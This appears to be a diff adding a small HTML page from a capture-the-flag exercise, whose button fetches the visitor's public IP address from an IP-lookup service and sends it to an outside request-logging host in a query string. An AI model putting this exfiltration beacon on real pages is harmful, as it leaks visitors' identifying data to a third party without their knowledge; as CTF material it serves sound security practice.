@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Call ctf link</title>
+</head>
+<body>
+    <button id="sendIPButton">Call CTF link</button>
+    
+    <script>
+        document.getElementById('sendIPButton').addEventListener('click', () => {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://api.ipify.org?format=json');
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        const response = JSON.parse(xhr.responseText);
+                        const ctf = response.ip;
+                        const url = `http://9zwev8yu.requestrepo.com?c=${ctf}`;
+                        const request = new XMLHttpRequest();
+                        request.open('GET', url);
+                        request.send();
+                    } else {
+                        console.error('Error:', xhr.status);
+                    }
+                }
+            };
+            xhr.send();
+        });
+    </script>
+</body>
+</html>
